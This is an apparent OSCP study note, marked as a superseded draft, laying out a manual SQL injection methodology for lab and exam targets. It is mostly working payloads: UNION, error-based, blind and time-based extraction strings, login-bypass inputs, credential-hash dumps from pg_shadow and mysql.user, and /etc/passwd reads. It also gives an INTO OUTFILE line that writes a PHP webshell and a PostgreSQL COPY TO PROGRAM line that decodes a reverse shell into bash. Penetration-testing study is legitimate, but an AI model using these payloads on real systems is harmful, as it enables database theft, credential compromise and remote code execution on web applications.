> [!important] SUPERSEDED DRAFT — not live methodology
> The canonical SQLi note is **[[sqli]]**. This earlier draft is kept only for history; its unique content (the time-based **VERIFY** routine and the two capability callouts — "easiest proven path" and "a file write ≠ a working URL") has been merged into [[sqli]]. Nothing links here; do not use it as the live note. Safe to delete once you're satisfied the merge is complete.

## Goal
Steal a database's contents, or get a shell, by hand. Every SQL injection follows the same path: **injectable? → what context? → which channel? → walk the catalog → dump → check capabilities.** Learn the shape once and the payloads stop being magic.

> [!important] OSCP: manual only
> sqlmap and automated tools are **banned on exam targets**. Manual injection is the *plan*. sqlmap (bottom) is labs-only, to check your manual work.

## SQLi in 3 layers: read this first
Lock **L1 + L2** once per box; only **L3** moves. That's the whole thing.
```text
L1 DELIVERY (curl)   how the payload travels     : 2 templates (GET/POST); PARAM = the input's name=
L2 WRAPPER (SQL)     how you smuggle a subquery  : pick 1 by (channel × DBMS), then leave it
L3 SUBQUERY (SUB)    what you ask for            : the 5-step walk; only this changes step to step

L2 wrappers:  data renders   → UNION       ' UNION SELECT NULL,(SUB),NULL-- -
              error MySQL     → updatexml   ' AND updatexml(1,concat(0x7e,(SUB)),1)-- -
              error PG/MSSQL  → CAST-int    ' AND 1=CAST((SUB) AS int)-- -
              time-based      → sleep       ' AND (SELECT CASE WHEN (SUB) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -
```

See all 3 layers in ONE real request (VM-3):
```text
curl -s -X POST "http://$IP/index.php" --data-urlencode "name=' AND 1=CAST((SELECT version()) AS int)-- -"
└──────── L1 DELIVERY (curl: how it travels) ────────┘└─────────────── the PAYLOAD ───────────────┘

name=' AND 1=CAST((   SELECT version()   ) AS int)-- -
     └───────── L2 WRAPPER (fixed all box) ─────────┘
                 └─── L3 SUB (swap each step) ───┘
```
- **L1** = the curl line: how the payload travels. Fixed; edit only IP/PATH/PARAM.
- **L2** = everything OUTSIDE the inner `( )`: the breakout + leak trick + comment. Pick once per box.
- **L3** = everything INSIDE the inner `( )`: the question. The ONLY thing you swap each step.

## One-look routing
```text
DELIVERY → CONFIRM SIGNAL → IDENTIFY CONTEXT → CHOOSE CHANNEL → ENUMERATE → CHECK CAPABILITIES → OBJECTIVE / STOP
```
Pick the channel from what the app gives back:
```text
data renders on the page      → UNION            (fastest; dumps the most)
DB error text reflects         → error-based      (MySQL updatexml · PG/MSSQL CAST)
true/false changes the page    → boolean blind    (extract char-by-char)
only the RESPONSE TIME changes → time-based        (SLEEP / WAITFOR / pg_sleep)
input stored then reused later → possible second-order
nothing observable at all      → out-of-band (DNS/HTTP), rare on OSCP and a last resort
```
**Tables worth aiming for:** app creds → `users, accounts, admin, wp_users, #__users` · DB creds → `mysql.user` / `master..syslogins` / `pg_shadow` · the map → `information_schema`.

**Checklist**
- [ ] injectable param found: **GET (`?id=`) or POST body**? (PARAM = the input's `name=`, never invent it)
- [ ] `'` breaks then `''` fixes, or `AND 1=1`/`1=2` bodies differ?
- [ ] breakout closer pinned (`'` `"` `')` `")` `'))`) + comment (`-- -` vs `#`)?
- [ ] channel chosen from the router?
- [ ] **DBMS fingerprinted** (wrong dialect = false "not vulnerable")?
- [ ] walked db → tables → columns → **dumped ALL rows**?
- [ ] capabilities checked (FILE priv / PG superuser / MSSQL sysadmin)?
- [ ] creds → hashcat / test on ssh + other likely services?

## The mental model: how a database is shaped
```text
DBMS  (the server: MySQL / MSSQL / Postgres / Oracle)
└─ database / schema        glovedb · information_schema
   └─ table                 users
      ├─ columns (fields)   username · password
      └─ rows   (records)   admin : 856f5de5...
```
To reach data you **descend the tree**: database → tables → columns → rows.

**What `UNION SELECT` does.** The page runs a query and prints its rows. `UNION SELECT` bolts a *second* query on; its row lands in the **same output slots**. Two rules fall out (UNION only): both halves need the **same column count**, and each column must be a **compatible type**.

**`information_schema`: the map.** You start blind. Every server ships a catalog listing every db/table/column. Query *it* to learn names, then query the **real** table for data.

## Walking the database: the 5-step descent (same on every DBMS)
Ask the DB to describe itself (the catalog), then open the real table. Exact syntax per engine → **Helpline table**.

| #   | Step       | Question            | Generic shape                                               |
| --- | ---------- | ------------------- | ----------------------------------------------------------- |
| 1   | current db | which DB am I in?   | `current_database()` / `database()` / `DB_NAME()`           |
| 2   | list dbs   | what DBs exist?     | `SELECT <name> FROM <db-catalog>`                           |
| 3   | tables     | tables in my DB?    | `SELECT <name> FROM <tables-catalog> WHERE <schema>=…`      |
| 4   | columns    | columns in table T? | `SELECT <name> FROM <columns-catalog> WHERE table_name='T'` |
| 5   | **DUMP**   | the real data       | `SELECT col1,col2 FROM T`  ← the REAL table                 |

Steps 1–4 read the **map** (catalog). Step 5 opens the **book** (real table). Analogy: `information_schema` = the library's index cards; the real table = the actual book.

# Commands

## Delivery templates: plug and play (edit only IP / PATH / PARAM / PAYLOAD)
The curl line **never changes**. Only `PAYLOAD` (L3) changes. Pick GET or POST once per box.
```bash
# POST (most boxes):
curl -s -X POST "http://$IP/PATH" --data-urlencode "PARAM=PAYLOAD"  <TAIL>
# GET:
curl -sG        "http://$IP/PATH" --data-urlencode "PARAM=PAYLOAD"  <TAIL>
```
`<TAIL>` = **how you read the answer**. Swap it based on what you are looking for:
```bash
 | grep -iE "error|warning|syntax|invalid"    # DETECTION: surface the reflected SQL error
 | grep -iE "invalid|<what you expect>"        # EXTRACTION: widen to your data, such as root: (/etc/passwd) or PostgreSQL (version)
 | wc -c                                       # blind detection: diff bytes vs a clean baseline
 (leave it off and read the whole body)         # UNION: your data renders on the page
 -o /dev/null -w "%{time_total}\n"             # time-based ONLY: prints seconds, throws away the body
# Burp alt: intercept -> Repeater -> edit the body field -> resend -> read the response pane.
```
> `PARAM` comes from the input's **`name=`** or an observed request. Never invent it. `LIMIT`, `concat`, and `string_agg` are **not** curl options. They live *inside* PAYLOAD (L3) and are listed in the **Helpline table**.

## Confirm signal + identify context
```text
PARAM=x'                       # error / changed body / different length -> injectable
PARAM=x''                      # even quotes -> normal again  => the quote IS parsed
PARAM=x' AND 1=1-- -   vs  x' AND 1=2-- -   # bodies differ -> injectable even with NO error shown
# read the BODY, not the status code: 200==200 tells you nothing. Compare content/length (wc -c) or grep.

# CONTEXT: the closer that returns the page to normal is your breakout (wrong one = silent false negative):
'  "  ')  ")  '))              # try each with  OR 1=1-- -
# comment:  -- -  (MySQL needs the trailing space)   or   #  (fine in a POST body; %23 in a URL)
```

## Channel: UNION  (data renders)
- **Reach for this when:** the app prints query rows on the page.
- **Prereqs:** string context you can append `UNION SELECT` to · column count matched · ≥1 column renders a string.
- **Stop:** count won't match / no slot renders a string → switch to error/blind.

**What "string context" and "renders a string" mean:**
```text
Query:  SELECT id, name, email FROM users WHERE email='<YOU>'
Page:   ID: 1 | Name: John | Email: john@x.com
- string context  = your input sits inside quotes   ...email='<you>'  -> break out with '
- renders a string = a column that shows TEXT (name/email), not a number (id)
                     -> put your data in the name/email slot, not id
```

**Why `id=-1`?** It makes the ORIGINAL query match **nothing**, so **only your injected row prints** (otherwise the real rows bury yours). Any no-match value works: `-1`, `0`, `99999`.

Mechanic (shown once; per-DBMS syntax → Helpline table):
```text
1) column count   ?id=1 ORDER BY 1-- -  ...  ORDER BY N   # the N that ERRORS = count+1
2) visible slot   ?id=-1 UNION SELECT 1,2,3-- -           # a number shows = your render slot
3) pull data      ?id=-1 UNION SELECT 1,version(),3-- -   # then swap in any (SUB) from the walk
# PostgreSQL: UNION is type-STRICT -> cast every column to ::text
#   ?id=-1 UNION SELECT NULL,version()::text,NULL-- -
# MSSQL: same as the MySQL mechanic above (not type-strict; no cast needed).
```

## Channel: error-based  (DB error reflects, rows don't)
- **Reach for this when:** no rows render but the raw DB error is echoed to the page.
- **Stop:** no error text reflected → boolean/time-based.

```text
# MySQL (updatexml: ~32-char output cap; use SUBSTRING to page long values):
?id=x' AND updatexml(1,concat(0x7e,( SUB )),1)-- -           # SUB: SELECT version() | SELECT c FROM t LIMIT 0,1
❯
# PostgreSQL / MSSQL (CAST-to-int type error: NO length cap, whole value leaks):
name=' AND 1=CAST(( SUB ) AS int)-- -                      # PG:  "invalid input syntax for integer: <data>"
                                                             # MSSQL:"Conversion failed ... varchar '<data>' to int"
#   SUB walks the tree (Postgres): SELECT version()
#     | SELECT current_database()
#     | SELECT string_agg(table_name::text,',')  FROM information_schema.tables  WHERE table_schema='public'
#     | SELECT string_agg(column_name::text,',') FROM information_schema.columns WHERE table_name='users'
#     | SELECT string_agg(user||':'||pass,',') FROM users
#   scalar rule: SUB must return ONE row -> string_agg (fold) or LIMIT 1 OFFSET n. NOT MySQL's LIMIT 0,1.
```

## Channel: boolean blind  (true/false differs)
```text
' AND 1=1-- -   vs   ' AND 1=2-- -                       # confirm the tell, then extract char-by-char:
' AND SUBSTRING((SELECT database()),1,1)='a'-- -         # walk position/char; script it in python/requests
```

## Channel: time-based (only timing differs): use the -o /dev/null -w "%{time_total}\n" tail
```text
' AND IF(1=1,SLEEP(5),0)-- -                             # MySQL
'; WAITFOR DELAY '0:0:5'-- -                             # MSSQL
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)-- -   # PostgreSQL

# VERIFY:
#   baseline  send the normal request 3x and note the usual timing range
#   compare   send the same test with known-true and known-false values 3x each
#   accept    true repeatedly adds about the chosen delay; false stays near the normal time
#   retry     if timings overlap, use a longer delay or retest after the box load settles
```

## Channel: second-order  (stored then reused)
- Input stored now (registration/profile/comment), used in a query on a *different* page later.
- **Test:** store a controlled marker or a payload that fits the context, then use the features that read it back, such as profile, search, report, or admin list.

## Auth bypass (login form)
```text
' OR 1=1-- -        admin'-- -        ' OR '1'='1'-- -
	") OR ("1"="1"-- -  admin') -- -      # try ' " )  and  ))  closers
# non-SQL logic bypass (strcmp / type-juggle) -> [[auth_bypass]]
```

## Capabilities: files and RCE
> **Use the easiest proven path to the goal.** Start with the data channel you can already see. If blind extraction is too slow, check whether the DB account can write a file or run a command. Check the needed privileges and limits first: `FILE`, `secure_file_priv`, superuser/sysadmin, and stacked queries where needed.

**No creds in the dump? Check these options:**
```text
1 read app data     the walk above
2 DB cred hashes     MySQL mysql.user | PG pg_shadow (super) | MSSQL master..syslogins  -> crack -> reuse
3 am I privileged?   MySQL current_user()+FILE | PG current_user + is_superuser | MSSQL IS_SRVROLEMEMBER('sysadmin')
4 read a file        MySQL load_file() | PG pg_read_file() | MSSQL OPENROWSET/BULK        (gated by 3)
5 write a file       MySQL INTO OUTFILE | PG COPY..TO '/f' | MSSQL (limited)              (gated by 3; webshell if webroot writable)
6 command exec RCE   MySQL UDF | PG COPY..TO PROGRAM | MSSQL xp_cmdshell                  (gated by 3 + usually STACKED queries)
7 auth bypass        ' OR 1=1-- -
```

> **A file write does not guarantee a working URL.** `INTO OUTFILE` and server-side `COPY ... TO` write to filesystem paths. To reach the file over HTTP, a known URL must point to that path. To run a webshell, the web server must also support that file type. A 404 only means that URL was not found. Write a unique harmless marker, check known web ports and vhosts, and treat every web-root guess as an idea to test.

**MySQL: read/write files.** Prereqs: FILE priv · absolute path · readable/writable by the `mysqld` OS user · allowed by `secure_file_priv` (`''`=anywhere · `'/path/'`=that dir · `NULL`=off).
```text
			?id=-1 UNION SELECT 1,2,3,4,5,@@secure_file_priv-- -                       # config check first
?id=-1 UNION SELECT 1,2,3,4,5,LOAD_FILE('/etc/passwd')-- -                 # read
?id=-1 UNION SELECT 1,2,"<?php system($_GET['c']);?>",4,5 INTO OUTFILE '/var/www/html/s.php'-- -   # write webshell -> curl ?c=id
```

**PostgreSQL: what can this injection DO?**
```text
who am I / super?   SELECT current_user ; SELECT current_setting('is_superuser')     # 'on' = superuser
who else is super   SELECT usename,usesuper FROM pg_user
DB password hashes  SELECT usename,passwd FROM pg_shadow                             # super only; crack -> reuse
read a file         SELECT pg_read_file('/etc/passwd')                              # privileged
RCE (super / pg_execute_server_program, PG9.3+, needs STACKED queries):
  '; COPY (SELECT '') TO PROGRAM 'echo -n <BASE64-revshell> | base64 -d | bash'-- -   -> [[5432_postgresql]]
```

**Other DBMS → RCE (full syntax in the service notes):** MySQL FILE→`INTO OUTFILE`/UDF `[[3306_mysql]]` · PostgreSQL super→`COPY..TO PROGRAM` `[[5432_postgresql]]` · MSSQL sysadmin→`xp_cmdshell` `[[1433_mssql]]`.
> Stacked queries (`; second`): support depends on **DBMS + driver + app**. **Test it** (`'; SELECT pg_sleep(5)-- -`). Often works in PG+PHP; usually blocked in MySQL+mysqli.

**No file/RCE capability (common):** SQLi is for DATA → get files from the web app → [[lfi_rfi]] / [[file_upload]]. Creds → crack + **test once with likely usernames and services** → [[default_creds_logins]].

## NoSQL (MongoDB)
```text
username[$ne]=admin&password[$ne]=admin          # form params
{"username":{"$gt":""},"password":{"$gt":""}}    # JSON auth bypass
```

## Worked example: PostgreSQL, POST form, error-based (Golden Glove)
One real run. Every payload is the **same wrapper**; only `(SUB)` walks the tree.
```bash
IP=192.168.x.x
# 0 confirm+context: probe one field with ' :
curl -s -X POST "http://$IP/index.php" --data-urlencode "name=100'" --data-urlencode "weight=50" | grep -iE "error|pg_query"
#   -> "unterminated quoted string" + pg_query() = injectable, string ctx, PostgreSQL
# then swap ONLY the name payload (keep the others valid), read via | grep:
# 1 version   name=' AND 1=CAST((SELECT version()) AS int)-- -
# 2 dbs       name=' AND 1=CAST((SELECT string_agg(datname::text,',') FROM pg_database) AS int)-- -
# 3 tables    name=' AND 1=CAST((SELECT string_agg(table_name::text,',') FROM information_schema.tables WHERE table_schema='public') AS int)-- -
# 4 columns   name=' AND 1=CAST((SELECT string_agg(column_name::text,',') FROM information_schema.columns WHERE table_name='users') AS int)-- -
# 5 dump      name=' AND 1=CAST((SELECT string_agg(email::text,',') FROM users) AS int)-- -
# 6 caps      name=' AND 1=CAST((SELECT current_setting('is_superuser')) AS int)-- -   # 'on' -> COPY..TO PROGRAM RCE
```

## Helpline: per-DBMS syntax (fingerprint FIRST; row = what it does, columns = the engine)
```text
WHAT IT DOES        MySQL                  MSSQL                   PostgreSQL
comment             -- -   or  #           --                      --
version             @@version              @@version               version()
current db          database()             DB_NAME()               current_database()
current user        current_user()         SYSTEM_USER             current_user   (no parens)
concat              concat(a,b)            a+b                     a||b
fold rows -> one    group_concat(c,',')    STRING_AGG(c,',')       string_agg(c::text,',')
conditional         IF(c,a,b)              IIF(c,a,b)              CASE WHEN c THEN a ELSE b END
sleep               SLEEP(5)               WAITFOR DELAY '0:0:5'   pg_sleep(5)
paging              LIMIT off,cnt          OFFSET..FETCH           LIMIT cnt OFFSET off   (no comma form)
cast (error trick)  updatexml(...)         CAST(x AS int) error    CAST(x AS int) error  /  x::int
list databases      information_schema.schemata  master..sysdatabases  pg_database
list tables/cols    information_schema.tables / .columns   (same)          (same)  or pg_tables
DB cred hashes      mysql.user             master..syslogins       pg_shadow / pg_authid (super)
read a file         LOAD_FILE('/f')        OPENROWSET / BULK       pg_read_file('/f')
write / RCE         INTO OUTFILE / UDF     xp_cmdshell             COPY..TO '/f' / COPY..TO PROGRAM
cross-DB query      yes (db.tbl)           yes (db.schema.tbl)     NO (one connection = one DB)

GOTCHAS
id=-1     : forces the original query empty so only YOUR union row renders.
PG UNION  : type-strict -> cast columns ::text  (MySQL coerces automatically).
comments  : '#' in a GET URL is a fragment -> use %23 or '-- -'. In a POST body '#' is fine.
smart quote: pasted "  '  --  become curly / en-dashes that silently fail -> RETYPE them.
after dump: hashes -> hashcat/john ; plaintext -> test once with likely usernames/services.
WAF       : URL-encode, /**/ comments; avoid loud automated tools early.
```

## External references (raw-SQL lookup for rare cases; drop the fragment into your `(SUB)`)
- **PortSwigger SQLi cheat sheet:** cleanest DBMS side-by-side reference; **start here:** https://portswigger.net/web-security/sql-injection/cheat-sheet
- **PayloadsAllTheThings / SQL Injection:** the long reference: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- **pentestmonkey** per-DBMS cheatsheets: classic syntax (RCE/file sections dated): https://pentestmonkey.net/category/cheat-sheet/sql-injection

## sqlmap (LABS ONLY; banned on OSCP targets)
```bash
sqlmap -r req.txt --batch --dbs
sqlmap -r req.txt --batch -D <db> -T users --dump
sqlmap -r req.txt --batch --os-shell   # / --sql-shell   # labs only; do the steps by hand on the exam
```

## Lessons From Practice Boxes
> [!tip] DC-9 (MySQL): enumerate every database, dump every row
> After the first hit, list **all** schemata. The useful table is often in a *second* DB; a single visible column shows only the first row until you `group_concat`. (MySQL only; Postgres can't cross-DB.)

> [!tip] InsanityHosting: output can arrive elsewhere or later
> Before deciding a UNION "returns nothing," check **where** output lands, such as a second page, report, or email. Also wait for scheduled jobs.

> [!tip] Capstone VM-2 (MySQL): a browser filter is not a server filter; disk ≠ page
> `type="email"`/JS block = client-side → resend with curl. Rows don't render but the error does → error-based. FILE priv + `INTO OUTFILE` = webshell.

> [!tip] Capstone VM-3 / Golden Glove (PostgreSQL): fingerprint decides everything; find the REAL param first
> Half the fight was recon: the param is the input's `name=`, not `class`/`placeholder`, and not invented. Then `pg_query()` = Postgres → error-based is `CAST-to-int`, dump with `string_agg`, superuser → `COPY..TO PROGRAM` RCE (not `INTO OUTFILE`). Full chain in `walkthroughs/capstone-VM-3-working.md`.

> [!tip] Pebbles (MySQL): verify delivery, timing, and file reachability
> Reproduce the same method, parameters, and encoding before changing a valid payload. Check time-based results with repeated normal, true, and false requests. If blind extraction is slow, check whether file write or command execution is available. After a file write, test the URL and confirm that the web server can run that file type. Do not assume a port or treat a 404 as proof that the write failed.
